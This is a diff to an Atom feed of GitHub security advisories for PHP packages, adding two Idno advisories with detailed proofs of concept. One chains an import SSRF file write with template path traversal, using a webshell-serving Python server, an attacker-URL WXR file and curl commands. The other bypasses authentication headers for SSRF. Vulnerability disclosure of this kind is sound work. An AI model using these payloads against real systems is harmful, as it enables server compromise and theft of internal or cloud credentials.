@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-03-02T21:07:11.277Z</updated>
+    <updated>2026-03-02T22:04:31.688Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,432 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[idno/known] Idno Vulnerable to Remote Code Execution via Chained Import File Write and Template Path Traversal]]></title>
+        <id>https://github.com/advisories/GHSA-37j7-56xc-c468</id>
+        <link href="https://github.com/advisories/GHSA-37j7-56xc-c468"/>
+        <updated>2026-03-02T21:26:25.000Z</updated>
+        <content type="html"><![CDATA[<p><strong>Affected Versions:</strong> Tested on current <code>dev</code> branch (build fingerprint <code>505[...]7bd86</code>)<br><strong>CVSS v4 Score:</strong> 8.6 (<a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N">CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N</a>)
+<strong>Privileges Required:</strong> Web application admin account (for file write), any authenticated user (for RCE trigger)</p>
+<hr>
+<h2 id="summary">Summary</h2>
+<p>Two separate vulnerabilities in Idno can be chained to achieve RCE from a web application admin account. A web application admin can cause the server to fetch an attacker-controlled URL during WordPress import processing, writing a PHP file to the server's temp directory. The admin or a separate, lower-privileged authenticated user can then trigger inclusion of that file via an unsanitized template name parameter, executing arbitrary operating system commands as the web server user.</p>
+<hr>
+<h2 id="vulnerability-1-arbitrary-php-file-write-via-wordpress-import-ssrf--file-write">Vulnerability 1: Arbitrary PHP File Write via WordPress Import (SSRF + File Write)</h2>
+<h3>Location</h3>
+<p><code>Idno/Core/Migration.php</code> — <code>importImagesFromBodyHTML()</code></p>
+<h3 id="required-privilege">Required Privilege</h3>
+<p>Web application admin (any user with the <code>admin</code> flag set in the database, accessible via the Idno admin UI).</p>
+<h3 id="description">Description</h3>
+<p>When a web application admin imports a WordPress eXtended RSS (WXR) XML file via <code>POST /admin/import/</code>, the application processes <code>&lt;img&gt;</code> tags in post body content and attempts to re-host images locally. The function<code>importImagesFromBodyHTML()</code> fetches each image URL using <code>fopen()</code> and writes the response body to a temp file whose name is derived from the URL.</p>
+<p>The filename is constructed as:</p>
+<pre><code class="language-php">$name = md5($src);
+$newname = $dir . $name . basename($src);
+</code></pre>
+<p>Where <code>$src</code> is the full image URL from the XML and <code>basename($src)</code> is the filename component of that URL. Because <code>basename()</code> is applied to the URL string rather than a sanitized path, an attacker who controls the URL can make <code>basename()</code> return any filename — including one ending in <code>.tpl.php</code>.</p>
+<p>The URL filter is:</p>
+<pre><code class="language-php">if (substr_count($src, $src_url)) {
+</code></pre>
+<p>Where <code>$src_url</code> is the hardcoded string <code>'wordpress.com'</code>. This check uses <code>substr_count</code> rather than comparing the URL's hostname, so it passes for any URL that contains the string <code>wordpress.com</code> anywhere — including in a path component such as <code>http://attacker.com/wordpress.com/shell.tpl.php</code>.</p>
+<p>The file write itself is:</p>
+<pre><code class="language-php">if (@file_put_contents($newname, fopen($src, 'r'))) {
+</code></pre>
+<p><code>fopen($src, 'r')</code> opens the attacker URL as a stream. <code>file_put_contents</code> reads from the stream in chunks and writes to disk. Because the attacker controls the HTTP server, they can hold the TCP connection open after sending the PHP payload — causing <code>file_put_contents</code> to block while the file sits on disk with its full content. The file is only deleted after <code>file_put_contents</code> returns:</p>
+<pre><code class="language-php">if ($file = File::createFromFile($newname, basename($src), $mime, true)) {
+    $newsrc = ...;
+    @unlink($newname);  // only runs after file_put_contents returns
+}
+</code></pre>
+<p>By holding the connection open, the attacker controls how long the file exists on disk, creating an exploitable window.</p>
+<p>The import endpoint itself adds an additional timing buffer:</p>
+<pre><code class="language-php">// Idno/Pages/Admin/Import.php
+session_write_close();
+$this-&gt;forward(...);      // HTTP response sent to browser here
+ignore_user_abort(true);
+sleep(10);                // 10 second delay before import runs
+set_time_limit(0);
+Migration::importWordPressXML($xml);
+</code></pre>
+<p>The browser receives a redirect response immediately, and the actual import runs in the background after 10 seconds.</p>
+<p>The resulting file is written to PHP's temp directory (typically <code>/tmp</code> from the PHP process's perspective, which on systemd-managed Apache is a private mount at <code>/tmp/systemd-private-{id}-apache2.service-{id}/tmp/</code>). The filename is predictable: <code>md5($full_url) . basename($url)</code>.</p>
+<h3 id="prerequisites">Prerequisites</h3>
+<ul>
+<li>Text plugin must be enabled (the import function returns early without it) (this appears to be enabled by default)</li>
+<li><code>allow_url_fopen</code> must be enabled in PHP (required for <code>fopen($url, 'r')</code> on remote URLs — this is the PHP default)</li>
+</ul>
+<hr>
+<h2 id="vulnerability-2-local-file-inclusion-via-unsanitized-template-name-lfi-→-rce">Vulnerability 2: Local File Inclusion via Unsanitized Template Name (LFI → RCE)</h2>
+<h3 id="location-1">Location</h3>
+<p><code>Idno/Pages/Search/User.php</code> — <code>getContent()</code>
+<code>Idno/Core/Bonita/Templates.php</code> — <code>draw()</code></p>
+<h3 id="required-privilege-1">Required Privilege</h3>
+<p>Any authenticated user (<code>gatekeeper()</code> only checks <code>isLoggedIn()</code>).</p>
+<h3 id="description-1">Description</h3>
+<p>The user search endpoint accepts a <code>template</code> GET parameter that is passed without sanitization to the template rendering engine:</p>
+<pre><code class="language-php">// Idno/Pages/Search/User.php
+$template = $this-&gt;getInput('template', 'forms/components/usersearch/user');
+// ...
+$t = new \Idno\Core\DefaultTemplate();
+$results['rendered'] .= $t-&gt;__(['user' =&gt; $user])-&gt;draw($template);
+</code></pre>
+<p>The <code>draw()</code> method in <code>Idno/Core/Bonita/Templates.php</code> applies only a regex that strips strings beginning with an underscore followed by alphanumeric characters:</p>
+<pre><code class="language-php">function draw($templateName, $returnBlank = true)
+{
+    $templateName = preg_replace('/^_[A-Z0-9\/]+/i', '', $templateName);
+</code></pre>
+<p>This regex does not strip <code>../</code> and does not reject path separators. The sanitized name is then joined with a base path and template type directory to construct the include path:</p>
+<pre><code class="language-php">$path = $basepath . '/templates/' . $templateType . '/' . $templateName . '.tpl.php';
+if (file_exists($path)) {
+    $fn = (function ($path, $vars, $t) {
+        foreach ($vars as $k =&gt; $v) { ${$k} = $v; }
+        ob_start();
+        include $path;
+        return ob_get_clean();
+    });
+    return $fn($path, $this-&gt;vars, $this);
+}
+</code></pre>
+<p>Because <code>$templateName</code> is user-controlled and contains no path traversal restrictions, an attacker can supply a value such as <code>../../../../../../tmp/{filename}</code> to include any file reachable by the PHP process that has a <code>.tpl.php</code> extension.</p>
+<h3 id="template-type-behaviour">Template Type Behaviour</h3>
+<p>The <code>new DefaultTemplate()</code> constructor calls <code>detectTemplateType()</code>, which calls <code>detectDevice()</code> based on the <code>User-Agent</code> header. For standard desktop browsers this returns <code>'default'</code>. The <code>_t</code> query parameter, intended to override the template type, sets the type on the global site template object — not on the locally constructed <code>$t</code> instance — and therefore has no effect on the include path used here. The template type component of the path is always <code>'default'</code> for this endpoint under normal conditions.</p>
+<p>The full resolved include path for a desktop browser with <code>basepath = /var/www/html/idno</code> is therefore:</p>
+<pre><code>/var/www/html/idno/templates/default/{template}.tpl.php
+</code></pre>
+<p>Supplying <code>template=../../../../../../tmp/{filename}</code> resolves to:</p>
+<pre><code>/tmp/{filename}.tpl.php
+</code></pre>
+<p>Because PHP's <code>$_GET</code> superglobal is accessible from all scopes including inside <code>include</code>d files, any PHP code in the included file can directly read query string parameters from the original HTTP request without any explicit passing mechanism.</p>
+<hr>
+<h2 id="chained-attack-flow">Chained Attack Flow</h2>
+<ol>
+<li><p><strong>Attacker controls a web server</strong> serving a PHP webshell file at a URL containing <code>wordpress.com</code> in the path, with filename ending in <code>.tpl.php</code>.</p>
+</li>
+<li><p><strong>Attacker constructs a WordPress WXR XML</strong> with an <code>&lt;img&gt;</code> tag whose <code>src</code> points to this URL.</p>
+</li>
+<li><p><strong>Admin submits the XML</strong> to <code>POST /admin/import/</code> with <code>import_type=WordPress</code>. The application responds immediately and runs the import in the background after 10 seconds.</p>
+</li>
+<li><p><strong><code>importImagesFromBodyHTML</code> is called.</strong> The URL passes the <code>substr_count($src, 'wordpress.com')</code> check. <code>fopen($src, 'r')</code> connects to the attacker's server, which sends the PHP payload and holds the connection open.</p>
+</li>
+<li><p><strong><code>file_put_contents</code> writes the PHP payload to disk</strong> at <code>/tmp/{md5(url)}{basename(url)}</code> (e.g. <code>/tmp/594ac6416712b71b978fa4659c4298c3shell.tpl.php</code>) and blocks waiting for the stream to close.</p>
+</li>
+<li><p><strong>While the connection is held open</strong>, any authenticated user sends:</p>
+<pre><code>GET /search/users/?query=a&amp;limit=1&amp;template=../../../../../../tmp/594ac6416712b71b978fa4659c4298c3shell&amp;cmd=id
+</code></pre>
+</li>
+<li><p><strong><code>draw()</code> resolves the path</strong> to <code>/tmp/594ac6416712b71b978fa4659c4298c3shell.tpl.php</code>, finds the file exists, and <code>include</code>s it.</p>
+</li>
+<li><p><strong>The included PHP file executes</strong>, reads <code>$_GET['cmd']</code> from the superglobal, and passes it to <code>system()</code>. Output is captured by <code>ob_get_clean()</code> and returned in the <code>rendered</code> field of the JSON response.</p>
+</li>
+<li><p><strong>Attacker closes the connection.</strong> <code>file_put_contents</code> returns, <code>createFromFile</code> runs, <code>@unlink</code> removes the temp file. No persistent artifact remains.</p>
+</li>
+</ol>
+<hr>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<ol>
+<li>Create a WXR file with the following content</li>
+</ol>
+<pre><code class="language-xml">&lt;rss version="2.0"
+    xmlns:content="http://purl.org/rss/1.0/modules/content/"
+    xmlns:wp="http://wordpress.org/export/1.2/"&gt;
+    &lt;channel&gt;
+      &lt;item&gt;
+        &lt;title&gt;Test Post&lt;/title&gt;
+        &lt;wp:post_type&gt;post&lt;/wp:post_type&gt;
+        &lt;wp:status&gt;publish&lt;/wp:status&gt;
+        &lt;content:encoded&gt;&lt;![CDATA[&lt;img
+  src="http://attacker-server-address/wordpress.com/shell.tpl.php"&gt;]]&gt;&lt;/content:encoded&gt;
+      &lt;/item&gt;
+    &lt;/channel&gt;
+&lt;/rss&gt;
+</code></pre>
+<ol start="2">
+<li>Run a server at <code>attacker-server-address</code> and host the file in path <code>wordpress.com/shell.tpl.php</code> such that fetching <code>http://attacker-server-address/wordpress.com/shell.tpl.php</code> sends the command execution payload.</li>
+</ol>
+<pre><code class="language-python">import http.server
+import time
+
+PAYLOAD = b'&lt;?php system($_GET["cmd"]); ?&gt;'
+
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "application/octet-stream")
+        self.end_headers()
+        self.wfile.write(PAYLOAD)
+        self.wfile.flush()
+        print(f"[*] Payload sent. Holding connection open...")
+        time.sleep(45)  # hold connection open for 45s
+        print(f"[*] Connection released")
+
+    def log_message(self, fmt, *args):
+        print(fmt % args)
+
+
+http.server.HTTPServer(("0.0.0.0", 9876), Handler).serve_forever()
+</code></pre>
+<ol start="5">
+<li><p>Import WXR from <code>http://idno-address/admin/import/</code> using the wordpress option.</p>
+</li>
+<li><p>Wait till the server receives a connection. In my server example, the connection remains open for 45 seconds which is enough time to exploit the issue.</p>
+</li>
+<li><p>Compute the md5 hash of payload URL <code>http://attacker-server-address/wordpress.com/shell.tpl.php</code>. In my example this is <code>594ac6416712b71b978fa4659c4298c3</code>. This means the webshell file is <code>594ac6416712b71b978fa4659c4298c3shell.tpl.php</code> with content</p>
+</li>
+</ol>
+<pre><code class="language-php">&lt;?php system($_GET[0]); ?&gt;
+</code></pre>
+<ol start="8">
+<li>Make this request as any authenticated user</li>
+</ol>
+<pre><code>curl -k \
+  -b "idno=&lt;cookie&gt;" \
+  "http://idno-address/search/users/?query=a&amp;limit=1&amp;template=../../../../../../tmp/594ac6416712b71b978fa4659c4298c3shell&amp;_t=rss&amp;cmd=id"
+</code></pre>
+<ol start="9">
+<li>Observe that the respone will have the command executed in the <code>rendered</code> field</li>
+</ol>
+<pre><code>{"count":1,"rendered":"uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(pihole)\n"}
+</code></pre>
+<p><a href="https://github.com/user-attachments/assets/9f36ce0e-8f73-42ba-908d-eb91cc4879b4">https://github.com/user-attachments/assets/9f36ce0e-8f73-42ba-908d-eb91cc4879b4</a></p>
+<hr>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Confidentiality:</strong> Full read access to files accessible by the web server user</li>
+<li><strong>Integrity:</strong> Arbitrary command execution as the web server user</li>
+<li><strong>Availability:</strong> Complete compromise of the host running Idno</li>
+</ul>
+<p>An attacker who obtains a web application admin account (via credential theft, weak password, or other means) can escalate to OS-level code execution. The RCE trigger itself requires only a standard authenticated session, meaning the admin account is needed only for the file write stage.</p>
+<hr>
+<h2 id="root-causes">Root Causes</h2>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Issue</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Migration.php:importImagesFromBodyHTML</code></td>
+<td><code>basename($url)</code> used as filename with no extension restriction</td>
+</tr>
+<tr>
+<td><code>Migration.php:importImagesFromBodyHTML</code></td>
+<td><code>substr_count</code> hostname check trivially bypassed by embedding <code>wordpress.com</code> in URL path</td>
+</tr>
+<tr>
+<td><code>Migration.php:importImagesFromBodyHTML</code></td>
+<td>Outbound <code>fopen()</code> to attacker-controlled URL with no SSRF mitigation</td>
+</tr>
+<tr>
+<td><code>Pages/Search/User.php</code></td>
+<td><code>template</code> parameter passed to <code>draw()</code> without sanitization</td>
+</tr>
+<tr>
+<td><code>Core/Bonita/Templates.php:draw()</code></td>
+<td>Regex strips only <code>^_[A-Z0-9/]+</code> prefix — does not restrict <code>../</code> or path separators</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="recommended-fixes">Recommended Fixes</h2>
+<ol>
+<li><p><strong>Restrict allowed template name characters</strong> in <code>draw()</code> to an allowlist such as <code>^[a-z0-9/_-]+$</code>, rejecting any name containing <code>..</code> or beginning with <code>/</code>.</p>
+</li>
+<li><p><strong>Validate the extension of files written by <code>importImagesFromBodyHTML</code></strong> against an allowlist of image extensions (jpg, jpeg, png, gif, webp) before writing to disk.</p>
+</li>
+<li><p><strong>Validate the hostname of image URLs</strong> in <code>importImagesFromBodyHTML</code> against the source domain rather than using <code>substr_count</code>, which does not distinguish hostname from path.</p>
+</li>
+<li><p><strong>Use <code>tempnam()</code></strong> for temp files in the import flow rather than constructing filenames from user-controlled URL components.</p>
+</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/idno/idno/security/advisories/GHSA-37j7-56xc-c468">https://github.com/idno/idno/security/advisories/GHSA-37j7-56xc-c468</a></li>
+<li><a href="https://github.com/idno/idno/releases/tag/1.6.4">https://github.com/idno/idno/releases/tag/1.6.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-37j7-56xc-c468">https://github.com/advisories/GHSA-37j7-56xc-c468</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-37j7-56xc-c468</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-02T21:26:24.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[idno/known] Idno Vulnerable to Unauthenticated SSRF via URL Unfurl Endpoint]]></title>
+        <id>https://github.com/advisories/GHSA-fcrh-fqxh-6fx6</id>
+        <link href="https://github.com/advisories/GHSA-fcrh-fqxh-6fx6"/>
+        <updated>2026-03-02T21:24:38.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>A logic error in the API authentication flow causes the CSRF protection on the URL unfurl service endpoint to be trivially bypassed by any unauthenticated remote attacker. Combined with the absence of a login requirement on the endpoint itself, this allows an attacker to force the server to make arbitrary outbound HTTP requests to any host, including internal network addresses and cloud instance metadata services, and retrieve the response content.</p>
+<p><strong>Component</strong>: <code>Idno/Pages/Service/Web/UrlUnfurl.php</code>, <code>Idno/Core/Session.php</code>, <code>Idno/Core/Actions.php</code><br><strong>Vulnerability Class</strong>: <a href="https://cwe.mitre.org/data/definitions/918.html">Server-Side Request Forgery (SSRF)</a>
+<strong>Authentication Required</strong>: None<br><strong>CVSSv4 Base Score:</strong> 9.2 (High) - <a href="https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N">AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N</a>
+<strong>Affected Endpoint</strong>: GET <code>/service/web/unfurl?url=&lt;attacker-controlled-url&gt;</code>
+Handled by <code>Idno\Pages\Service\Web\UrlUnfurl::getContent()</code>.
+<strong>Affected Versions</strong>: &lt;= 1.6.3</p>
+<pre><code>cat version.idno
+version = '1.6.3'
+build = 2026021301
+</code></pre>
+<h2 id="code-flow">Code Flow</h2>
+<h3 id="step-1--endpoint-access-control">Step 1 — Endpoint access control</h3>
+<p><code>UrlUnfurl::getContent()</code> (UrlUnfurl.php:36) enforces two access controls:<br><code>$this-&gt;xhrGatekeeper();</code>
+<code>$this-&gt;tokenGatekeeper();</code>  </p>
+<p>Notably, the original authentication check (<code>$this-&gt;gatekeeper()</code>) was explicitly removed with the following comment left in the source:</p>
+<pre><code class="language-php">//$this-&gt;gatekeeper(); // Gatekeeper to ensure this service isn't abused by third parties
+// UPDATE: Needs to be accessible to logged out users, TODO, find a way to prevent abuse
+</code></pre>
+<p>This leaves the endpoint accessible to unauthenticated users, with only the two remaining gatekeepers as a barrier.</p>
+<h3 id="step-2--bypassing-xhrgatekeeper">Step 2 — Bypassing xhrGatekeeper()</h3>
+<p><code>Page::xhrGatekeeper()</code> (Page.php:876) checks whether the request was made with the X-Requested-With:
+XMLHttpRequest header:</p>
+<pre><code class="language-php">function xhrGatekeeper()
+{
+    if (!$this-&gt;xhr) {
+        $this-&gt;deniedContent();
+    }
+}
+</code></pre>
+<p>This check is trivially bypassed by any HTTP client capable of setting custom headers.</p>
+<h3 id="step-3--bypassing-tokengatekeeper-via-premature-api-flag">Step 3 — Bypassing <code>tokenGatekeeper()</code> via premature API flag</h3>
+<p><code>Page::tokenGatekeeper()</code> (Page.php:887) calls <code>Actions::validateToken()</code>:</p>
+<pre><code class="language-php">function tokenGatekeeper()
+{
+    $url = $this-&gt;currentUrl();
+    $bits = explode('?', $url);
+    $url = $bits[0];
+    if (!\Idno\Core\Idno::site()-&gt;actions()-&gt;validateToken($url, false)) {
+        $this-&gt;deniedContent();
+    }
+}
+</code></pre>
+<p><code>Actions::validateToken()</code> (Actions.php:23) short-circuits entirely when <code>isAPIRequest()</code> returns true:</p>
+<pre><code class="language-php">public static function validateToken($action = '', $haltExecutionOnBadRequest = true)
+{
+    if (Idno::site()-&gt;session()-&gt;isAPIRequest()) {
+        return true;
+    }
+    return parent::validateToken($action, $haltExecutionOnBadRequest);
+}
+</code></pre>
+<p><code>isAPIRequest()</code> reads the <code>is_api_request</code> flag from the session:</p>
+<pre><code class="language-php">function isAPIRequest()
+{
+    if (!empty($_SESSION['is_api_request'])) {
+        return true;
+    }
+    return false;
+}
+</code></pre>
+<p>The flag is set in <code>Session::tryAuthUser()</code> (Session.php:488), which runs early in the request lifecycle. The critical defect is here:</p>
+<pre><code class="language-php">$apiUsername  = $_SERVER['HTTP_X_IDNO_USERNAME']  ?? $_SERVER['HTTP_X_KNOWN_USERNAME']  ?? null;
+$apiSignature = $_SERVER['HTTP_X_IDNO_SIGNATURE'] ?? $_SERVER['HTTP_X_KNOWN_SIGNATURE'] ?? null;
+if (!$return &amp;&amp; !empty($apiUsername) &amp;&amp; !empty($apiSignature)) {
+    $this-&gt;setIsAPIRequest(true);   // ← flag set here, before any credential check
+    $user = \Idno\Entities\User::getByHandle($apiUsername);
+    if (!empty($user)) {
+        $compare_hmac = base64_encode(hash_hmac('sha256', $_SERVER['REQUEST_URI'], $key, true));
+        if ($hmac == $compare_hmac) {       // ← HMAC verified here, too late
+            $return = $this-&gt;refreshSessionUser($user);
+        }
+    }
+}
+</code></pre>
+<p><code>setIsAPIRequest(true)</code> is called unconditionally as soon as both <code>X-IDNO-USERNAME</code> and <code>X-IDNO-SIGNATURE</code> headers are present, regardless of whether the supplied credentials are valid. The HMAC verification that follows is therefore irrelevant — by the time <code>tokenGatekeeper()</code> calls <code>validateToken()</code>, the API flag is already set and the token check returns true immediately.  </p>
+<p>An attacker supplying any non-empty values for these two headers — real or fabricated — bypasses CSRF protection entirely.</p>
+<h3 id="step-4--the-unfurl-fetch">Step 4 — The unfurl fetch</h3>
+<p>With both gatekeepers bypassed, execution reaches <code>UnfurledUrl::unfurl()</code> (UnfurledUrl.php:53):</p>
+<pre><code class="language-php">public function unfurl($url)
+{
+    $url = trim($url);
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        return false;
+    }
+    $contents = \Idno\Core\Webservice::file_get_contents($url);
+    ...
+    $this-&gt;data = $unfurled;
+    $this-&gt;source_url = $url;
+    return true;
+}
+</code></pre>
+<p><code>FILTER_VALIDATE_URL</code> accepts any valid URL including <a href="http://localhost/">http://localhost/</a>, <a href="http://169.254.169.254/">http://169.254.169.254/</a>, and <a href="http://10.0.0.1/">http://10.0.0.1/</a>. There is no allowlist, blocklist, or restriction on private/loopback address ranges.
+The fetched content is parsed for OpenGraph metadata and mf2 microformats, then returned to the caller in a JSON response, giving the attacker a full read of the response body from the internal target.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Step 1: Run a webserver on the server running Idno to emulate an internal service. Ensure this server is not accessible localhost.</p>
+<pre><code>python -m http.server --bind 127.0.0.1 9001
+Serving HTTP on 127.0.0.1 port 9001 (http://127.0.0.1:9001/) ...
+</code></pre>
+<p>Step 2: Verify that you cannot reach this server from a different system</p>
+<pre><code>curl http://rpi:9001
+curl: (7) Failed to connect to rpi port 9001 after 26 ms: Couldn't connect to server
+</code></pre>
+<p>Step 3: Make a request to the unfurl URL with required headers and observe that you can reach the internal service.</p>
+<pre><code class="language-sh">curl -s "http://rpi:9090/service/web/unfurl?url=http://localhost:9001/test.html" \
+    -H "X-Requested-With: XMLHttpRequest" \
+    -H "X-IDNO-USERNAME: x" \
+    -H "X-IDNO-SIGNATURE: x"
+{
+    "title": "Page Title",
+    "mf2": {
+        "items": [],
+        "rels": [],
+        "rel-urls": []
+    },
+    "id": null,
+    "rendered": "&lt;div class=\"row unfurled-url\" id=\"unfurled-url-\" data-url=\"http:\/\/localhost:9001\/test.html\"&gt;\n    &lt;div class=\"basics\"&gt;\n                    \n            &lt;div class=\"text\"&gt;\n                &lt;h3&gt;&lt;a href=\"http:\/\/localhost:9001\/test.html\" target=\"_blank\"&gt;Page Title&lt;\/a&gt;&lt;\/h3&gt;\n                \n                &lt;!--&lt;div class=\"byline\"&gt;&lt;a href=\"http:\/\/localhost:9001\/test.html\"&gt;localhost&lt;\/a&gt;&lt;\/div&gt;--&gt;\n            &lt;\/div&gt;\n    &lt;\/div&gt;\n    \n    &lt;\/div&gt;"
+}
+</code></pre>
+<p><a href="https://github.com/user-attachments/assets/6b8c7728-94e3-4b5e-ba7f-c0908e75d08c">https://github.com/user-attachments/assets/6b8c7728-94e3-4b5e-ba7f-c0908e75d08c</a></p>
+<h2 id="impact">Impact</h2>
+<p>Any unauthenticated remote attacker can force the server to issue HTTP requests to arbitrary destinations and retrieve response content. Practical attack scenarios include:</p>
+<ul>
+<li><p>Cloud instance metadata exfiltration (AWS, GCP, Azure): The SSRF can reach the instance metadata service. On AWS with IMDSv1 (the default prior to late 2019 and still common on older instances), this exposes temporary IAM
+credentials, which can be used to gain full access to the associated cloud account. On GCP and Azure
+equivalent endpoints expose OAuth tokens and subscription details.</p>
+</li>
+<li><p>Internal network reconnaissance: The attacker can probe internal hosts and ports by observing response content and timing differences. Open ports responding to HTTP return content; ports with no HTTP listener produce an error or timeout. This allows mapping of internal services (databases, caches, admin panels, other web applications) that are not exposed to the public internet.</p>
+</li>
+<li><p>Access to localhost-restricted services: Web applications and administration interfaces commonly restrict access to 127.0.0.1. The SSRF bypasses this restriction by routing requests through the server itself. This includes Idno's own admin interface if it is firewall-restricted, as well as co-located services such as database administration tools, monitoring dashboards, and internal APIs.</p>
+</li>
+<li><p>Interaction with internal services
+Services such as Redis (default: no authentication), Memcached, and internal HTTP APIs may be reachable and manipulable via crafted URLs, potentially enabling cache poisoning, data exfiltration, or triggering state-changing operations on internal systems.</p>
+</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>Move <code>setIsAPIRequest(true)</code> to after successful HMAC verification:</p>
+<pre><code class="language-php">if ($hmac == $compare_hmac) {
+    $this-&gt;setIsAPIRequest(true);   // only set after credentials are verified
+    $return = $this-&gt;refreshSessionUser($user);
+}
+</code></pre>
+<p>Defence in depth — block private address ranges in unfurl():
+The unfurl function should reject requests to RFC 1918 addresses, loopback, and link-local ranges:</p>
+<pre><code class="language-php">$host = parse_url($url, PHP_URL_HOST);
+if (filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+    // allowed
+} else {
+    return false; // block private/reserved ranges
+}
+</code></pre>
+<p>Note: An attempt was made to email the address provided in the <a href="security@idno.co">security page</a> but the address does not exist.</p>
+<pre><code>Your message wasn't delivered to security@idno.co because the address couldn't be found, or is unable to receive mail.
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/idno/idno/security/advisories/GHSA-fcrh-fqxh-6fx6">https://github.com/idno/idno/security/advisories/GHSA-fcrh-fqxh-6fx6</a></li>
+<li><a href="https://github.com/idno/idno/releases/tag/1.6.4">https://github.com/idno/idno/releases/tag/1.6.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-fcrh-fqxh-6fx6">https://github.com/advisories/GHSA-fcrh-fqxh-6fx6</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fcrh-fqxh-6fx6</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-03-02T21:24:37.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[wwbn/avideo] AVideo has Authenticated Remote Code Execution via Unsafe Plugin ZIP Extraction]]></title>
         <id>https://github.com/advisories/GHSA-v8jw-8w5p-23g3</id>
@@ -537,70 +963,6 @@ done
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-02-22T00:31:01.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mautic/core] Mautic is Vulnerable to SQL Injection through Contact Activity API Sorting]]></title>
-        <id>https://github.com/advisories/GHSA-r5j5-q42h-fc93</id>
-        <link href="https://github.com/advisories/GHSA-r5j5-q42h-fc93"/>
-        <updated>2026-02-25T19:28:40.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>This advisory addresses a SQL Injection vulnerability in the API endpoint used for retrieving contact activities. A vulnerability exists in the query construction for the Contact Activity timeline where the parameter responsible for determining the sort direction was not strictly validated against an allowlist, potentially allowing authenticated users to inject arbitrary SQL commands via the API.</p>
-<h3 id="mitigation">Mitigation</h3>
-<p>Please update to <strong>5.2.10</strong>, <strong>6.0.8</strong>, <strong>7.0.1</strong> or later.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None.</p>
-<h3 id="references">References</h3>
-<p>If there are any questions or comments about this advisory:</p>
-<p>Email Mautic at <a href="mailto:security@mautic.org">security@mautic.org</a></p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/mautic/mautic/security/advisories/GHSA-r5j5-q42h-fc93">https://github.com/mautic/mautic/security/advisories/GHSA-r5j5-q42h-fc93</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-3105">https://nvd.nist.gov/vuln/detail/CVE-2026-3105</a></li>
-<li><a href="https://github.com/mautic/mautic/releases/tag/5.2.10">https://github.com/mautic/mautic/releases/tag/5.2.10</a></li>
-<li><a href="https://github.com/mautic/mautic/releases/tag/6.0.8">https://github.com/mautic/mautic/releases/tag/6.0.8</a></li>
-<li><a href="https://github.com/mautic/mautic/releases/tag/7.0.1">https://github.com/mautic/mautic/releases/tag/7.0.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-r5j5-q42h-fc93">https://github.com/advisories/GHSA-r5j5-q42h-fc93</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-r5j5-q42h-fc93</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-02-25T19:28:39.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mautic/core] Mautic is Vulnerable to SQL Injection through Contact Activity API Sorting]]></title>
-        <id>https://github.com/advisories/GHSA-r5j5-q42h-fc93</id>
-        <link href="https://github.com/advisories/GHSA-r5j5-q42h-fc93"/>
-        <updated>2026-02-25T19:28:40.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
